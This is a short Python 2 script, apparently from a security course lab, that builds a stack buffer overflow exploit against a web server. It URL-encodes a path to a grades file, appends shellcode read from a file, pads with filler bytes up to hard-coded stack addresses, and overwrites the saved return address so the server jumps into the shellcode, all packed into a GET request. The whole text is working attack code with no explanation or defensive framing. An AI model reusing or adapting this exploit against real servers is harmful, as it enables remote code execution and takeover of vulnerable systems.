#!/usr/bin/python
import urllib
import struct

stack_buffer = 0xbfffee08
stack_rv = 0xbffff61c

def build_exploit():
    shellfile = open("shellcode-iny1.bin", "r")
    shellcode = shellfile.read()

    mystring = "/home/httpd/grades.txt\0"
    preff = "/" + urllib.quote(mystring)
    direcc = preff + shellcode
    shelloffset = len("/" + mystring)

    for x in xrange(0, stack_rv - stack_buffer - shelloffset - len(shellcode)  ):
        direcc += "a"
    direcc += urllib.quote( struct.pack( "<I", shelloffset+stack_buffer ) )

    req =   "GET " + direcc + " HTTP/1.0\r\n" + \
            "\r\n"
    return req
